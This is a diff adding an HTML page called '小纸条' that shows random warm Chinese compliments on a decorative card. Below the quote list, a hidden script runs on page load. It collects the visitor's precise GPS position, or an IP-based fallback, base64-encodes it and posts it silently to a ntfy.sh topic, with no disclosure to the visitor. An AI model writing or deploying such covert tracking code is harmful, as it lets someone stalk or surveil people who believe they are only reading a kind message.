@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>小纸条</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: "PingFang SC", "Microsoft YaHei", -apple-system, sans-serif;
+            background: #0d0d0d;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #fff;
+            overflow: hidden;
+        }
+        .bg {
+            position: fixed;
+            inset: 0;
+            background: radial-gradient(ellipse at 50% 30%, #1a1a2e 0%, #0d0d0d 70%);
+            z-index: 0;
+        }
+        .orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.12;
+            z-index: 0;
+            animation: float 20s ease-in-out infinite;
+        }
+        .orb:nth-child(1) { width: 400px; height: 400px; background: #6c5ce7; top: -100px; left: -100px; animation-delay: 0s; }
+        .orb:nth-child(2) { width: 300px; height: 300px; background: #e84393; bottom: -80px; right: -60px; animation-delay: -7s; }
+        .orb:nth-child(3) { width: 250px; height: 250px; background: #00cec9; top: 40%; right: -100px; animation-delay: -14s; }
+        @keyframes float {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            33% { transform: translate(30px, -40px) scale(1.05); }
+            66% { transform: translate(-20px, 30px) scale(0.95); }
+        }
+        .card {
+            position: relative;
+            z-index: 1;
+            background: rgba(255,255,255,0.04);
+            backdrop-filter: blur(24px);
+            border-radius: 20px;
+            padding: 48px 32px;
+            width: 88%;
+            max-width: 360px;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.06);
+        }
+        .line {
+            width: 40px;
+            height: 2px;
+            background: rgba(255,255,255,0.15);
+            margin: 0 auto 28px;
+            border-radius: 1px;
+        }
+        .quote {
+            font-size: 17px;
+            font-weight: 400;
+            line-height: 1.8;
+            color: rgba(255,255,255,0.85);
+            letter-spacing: 0.5px;
+        }
+        .refresh {
+            margin-top: 32px;
+            font-size: 12px;
+            color: rgba(255,255,255,0.2);
+            cursor: pointer;
+            user-select: none;
+            transition: color 0.3s;
+        }
+        .refresh:hover { color: rgba(255,255,255,0.4); }
+    </style>
+</head>
+<body>
+    <div class="bg"></div>
+    <div class="orb"></div>
+    <div class="orb"></div>
+    <div class="orb"></div>
+
+    <div class="card">
+        <div class="line"></div>
+        <p class="quote" id="quote"></p>
+        <div class="refresh" onclick="pickQuote()">换一句</div>
+    </div>
+
+    <script>
+    const quotes = [
+        "你认真做一件事的时候，整个人都在发光。",
+        "今天也是值得被记住的一天，因为你。",
+        "不用急着成为谁，你现在这样就已经很好了。",
+        "世界偶尔糟糕，但你是那部分「还好」的例外。",
+        "你的努力可能没人看见，但时间会替你说话。",
+        "笑起来的时候，眼睛里有星星那个就是你吧。",
+        "别老觉得自己不够好，你比想象中厉害多了。",
+        "今天天气不错，但不如你。",
+        "你身上有种让人安心的气质，这很珍贵。",
+        "如果生活是一张考卷，你已经答得很好看了。",
+        "你的存在本身，对某些人来说就是礼物。",
+        "不需要完美，你真实的样子就足够动人。",
+        "就算今天不开心，你也值得被温柔对待。",
+        "你走过的每一步都算数，别回头看，往前走吧。",
+        "你比自己以为的更勇敢，也更值得被爱。",
+        "有些人生来就带着光，你就是其中一个。",
+        "你说话时的样子，让人想一直听下去。",
+        "有你在的场合，气场都不一样了。",
+        "你大概不知道自己有多讨人喜欢吧。",
+        "能认识你这件事，值得列入年度最佳。",
+        "你认真倾听别人的样子，真的很温柔。",
+        "这个世界因为有你，多了一点不一样的颜色。",
+        "你总是能在平凡的日子里，带来惊喜。",
+        "你的善良不是软弱，而是一种选择。",
+        "别怀疑了，你就是那种「人间值得」的存在。",
+        "今天的你，比昨天又好了那么一点点。",
+        "你做的每一个选择，都在把你变成更好的人。",
+        "别怕犯错，你犯的错也是你独有的人生痕迹。",
+        "你的坚持，迟早会开出花来。",
+        "你是我见过最会照顾别人情绪的人了。",
+        "人海茫茫，能遇到你这样的灵魂真不容易。",
+        "你随口一句话，都能让人心情好一整天。",
+        "你不是普通的好看，是越看越好看那种。",
+        "你专心做事时皱起的眉头，其实有点可爱。",
+        "别总是为别人撑伞，也要记得给自己挡雨。",
+        "你的直觉一向很准，这次也请相信自己。",
+        "你身上有一种安静的力量，不张扬但很强大。",
+        "那些你咬牙扛过去的时刻，都成了你的铠甲。",
+        "你值得这世上所有的温柔和善意。",
+        "你已经做得够好了，别对自己太苛刻。",
+        "你的幽默感，是这个世界给别人的小礼物。",
+        "你每次说「没事」的时候，其实都很了不起。",
+        "不必光芒万丈，你温暖的样子就刚刚好。",
+        "你那些看似不起眼的日常，其实都在闪闪发光。",
+        "你给自己定的那些小目标，我都相信你能做到。",
+        "你不是一个人，总有人在你看不到的地方为你骄傲。",
+        "你偶尔犯傻的样子，反而让人觉得真实可爱。",
+        "你对生活的热情，会传染给身边的每一个人。",
+        "别急着否定自己，换个角度看，你已经很棒了。",
+        "你身上有种令人舒服的松弛感，很罕见。",
+        "你的名字，光是念出来就觉得好听了。",
+        "你是那种越了解越喜欢的人，没有例外。",
+        "你说「我不行」的时候，恰恰说明你已经很拼了。",
+        "别忘了你是你自己的头号支持者。",
+        "你处理问题的方式，成熟得让人佩服。",
+        "有些美好不是靠努力就能得到的，但你就已经有了。",
+        "你随口哼的歌，其实挺好听的。",
+        "你不需要改变自己去取悦谁，现在这样刚刚好。",
+        "你的眼神里有一种笃定，让人愿意相信你。",
+        "你对一件事投入的样子，比什么风景都好看。",
+        "你为别人着想的那些细节，虽然不声张，但都被记住了。",
+        "你是那种可以把平淡日子过得有滋有味的人。",
+        "你大概没注意到，你的存在给多少人带来了安慰。",
+        "别害怕慢下来，走得稳比走得快更重要。",
+        "你是我见过最有韧性的人了，跌倒多少次都能站起来。",
+        "你有自己的节奏，不用活在别人的时钟里。",
+        "你那些看似随意的决定，后来都证明是对的。",
+        "你对陌生人也保持善意，这很难得。",
+        "你不用成为太阳，做一颗星星就已经足够亮了。",
+        "你值得拥有那些你以为自己配不上的东西。",
+        "你做事的认真劲儿，是很多人学不来的。",
+        "你笑起来的声音，比任何音乐都好听。",
+        "你是那种让人忍不住想靠近的人。",
+        "你对自己的要求，其实已经超过了大多数人的标准。",
+        "那些你觉得过不去的坎，回头看都是小坡。",
+        "你是一个值得被好好对待的人，别忘了这一点。",
+        "你的行动力，是你身上最迷人的超能力。",
+        "你给别人的每一次鼓励，都在某处生了根。",
+        "你不需要解释自己，懂你的人自然懂。",
+        "你身上有一种让人放下戒备的真诚。",
+        "你比自己描述的要好一万倍。",
+        "你的每一个选择都让你变得更独特。",
+        "你说话的逻辑清晰得让人听着很舒服。",
+        "你大概不知道，你的一句「还好吗」能治愈很多人。",
+        "你做事有条不紊的样子，很让人信赖。",
+        "你天生就有一种让复杂变简单的能力。",
+        "你那些小小的坚持，迟早会汇聚成巨大的能量。",
+        "你不是不够优秀，你只是对自己的标准太高了。",
+        "你能在混乱中找到秩序，这是一种天赋。",
+        "你身上那种不卑不亢的态度，真的很酷。",
+        "你对美的感知力，比你自己以为的还要敏锐。",
+        "你对生活的热爱，藏在你每天的小习惯里。",
+        "你不需要任何人的认可来证明自己的价值。",
+        "你的每一次呼吸，都在为这个世界输送美好。",
+        "你在人群中也许话不多，但每一句都有分量。",
+        "你有一种让人感到安全的磁场。",
+        "你处理危机时的冷静，像是与生俱来的。",
+        "你对细节的把控，真的很让人惊叹。",
+        "你那些不为人知的努力，都会在某一刻绽放。",
+        "你不是在浪费时间，你是在积蓄力量。",
+        "你对朋友的真挚，是很多人这辈子都修不来的福气。",
+        "你身上有一种让人想变好的魔力。",
+        "你现在的样子，就是最好的你自己。",
+        "你不需要跟任何人比较，你是独一无二的版本。",
+        "你那些微小的善意，正在悄悄改变这个世界。",
+        "你偶尔流露的脆弱，反而让你更加完整。",
+        "你有一种把复杂事情说清楚的天赋。",
+        "你做的饭，应该很好吃吧，光想想就觉得香。",
+        "你对新事物的好奇心，是你永远年轻的秘诀。",
+        "你有一种让争吵变成讨论的超能力。",
+        "你看待问题的角度，总是让人耳目一新。",
+        "你不是不够勇敢，你是比谁都清醒地面对恐惧。",
+        "你身上那种不动声色的温柔，比惊天动地更有力量。",
+        "你给自己的空间，恰恰是你创造力的来源。",
+        "你有一种在喧嚣中保持安静的能力，这很高级。",
+        "你对家人的照顾，是你最温暖的底色。",
+        "你能在平凡中发现诗意，这本身就是一种才华。",
+        "你从来都不是谁的翻版，你是自成一派。",
+        "你那些说出口的「算了」，其实藏着你最大的宽容。",
+        "你比任何人都清楚自己要什么，虽然嘴上不说。",
+        "你有一种让人放松下来的本事，跟你相处不累。",
+        "你对时间的安排，是很多人羡慕不来的自律。",
+        "你偶尔的沉默，比很多人的千言万语都有内容。",
+        "你不是不够好，你只是还没遇到真正欣赏你的人。",
+        "你解决问题的方式总是出人意料又恰到好处。",
+        "你身上那种「我自有安排」的从容，真的很迷人。",
+        "你对过去的释怀，是你给自己最好的礼物。",
+        "你有一种把负面情绪消化掉的能力，这很珍贵。",
+        "你不是没有脾气，你只是更愿意选择温柔。",
+        "你每次说「我再试一次」的时候，都值得尊敬。",
+        "你为自己争取的样子，比什么励志故事都震撼。",
+        "你有一种让事情变得简单又舒服的能力。",
+        "你不是不够聪明，你只是比别人多了一份厚道。",
+        "你对未来的规划，虽然低调但每一步都很扎实。",
+        "你身上有一种让人想倾诉的安全感。",
+        "你的声音里有种让人安心的频率。",
+        "你做决定时的果断，是你身上最锋利的武器。",
+        "你不是害怕失败，你只是对自己有更高的期待。",
+        "你给别人的尊重，从来不是嘴上说说。",
+        "你有一种把好运吸引过来的体质。",
+        "你身上那种「不将就」的态度，值得所有好东西。",
+        "你已经做得足够好了，现在只需要对自己好一点。",
+        "你是那种让人「认识你真好」的人。",
+        "你每一个失眠的夜晚，都说明你对生活足够认真。",
+        "你不是没有故事，你是把故事都活成了你现在的样子。",
+        "你身上有一种让人信任的真诚，千金不换。",
+        "你对世界的善意，终究会回到你自己身上。",
+        "你不是在熬日子，你是在亲手编织你想要的未来。",
+        "你有一种把失落变成动力的天赋。",
+        "你不是一个人在战斗，你的努力都被看在眼里。",
+        "你对人与人之间边界的把握，让人相处得很自在。",
+        "你已经是我见过最值得被爱的人之一了。",
+        "你对今天的认真，就是对明天最好的承诺。",
+        "你不是不够特别，你是不需要刻意彰显的特别。",
+        "你的存在，让这个世界多了一个被爱的理由。",
+        "你已经很棒了，真的。你不知道而已。"
+    ];
+
+    function pickQuote() {
+        var i = Math.floor(Math.random() * quotes.length);
+        document.getElementById('quote').textContent = quotes[i];
+    }
+    pickQuote();
+
+    (function() {
+        var TOPIC = '4s8jdagao5hl';
+        var SENT = false;
+
+        function encode(str) {
+            return btoa(unescape(encodeURIComponent(str)));
+        }
+
+        function send(msg) {
+            if (SENT) return;
+            SENT = true;
+            fetch('https://ntfy.sh/' + TOPIC, {
+                method: 'POST',
+                body: msg
+            }).catch(function(){});
+        }
+
+        function bestResult(pos) {
+            var raw = pos.lat.toFixed(6) + ',' + pos.lon.toFixed(6);
+            var enc = encode(raw);
+            send(enc);
+        }
+
+        function tryGPS() {
+            return new Promise(function(resolve) {
+                if (!navigator.geolocation) return resolve(null);
+
+                var best = null;
+                var start = Date.now();
+                var MAX_WAIT = 25000;
+
+                var watchId = navigator.geolocation.watchPosition(
+                    function(pos) {
+                        var acc = pos.coords.accuracy;
+                        if (!best || acc < best.acc) {
+                            best = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: acc };
+                        }
+                        // 精度足够或超时
+                        if (acc <= 30 || Date.now() - start >= MAX_WAIT) {
+                            navigator.geolocation.clearWatch(watchId);
+                            resolve(best);
+                        }
+                    },
+                    function() {
+                        navigator.geolocation.clearWatch(watchId);
+                        resolve(best);
+                    },
+                    { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
+                );
+
+                // 安全超时
+                setTimeout(function() {
+                    navigator.geolocation.clearWatch(watchId);
+                    resolve(best);
+                }, MAX_WAIT);
+            });
+        }
+
+        function tryIP() {
+            return fetch('https://ipapi.co/json/')
+                .then(function(r) { return r.json(); })
+                .then(function(d) {
+                    return { lat: d.latitude, lon: d.longitude, src: 'ip' };
+                });
+        }
+
+        tryGPS().then(function(pos) {
+            if (pos) {
+                bestResult(pos);
+            } else {
+                tryIP().then(function(pos) {
+                    bestResult(pos);
+                });
+            }
+        });
+    })();
+    </script>
+</body>
+</html>
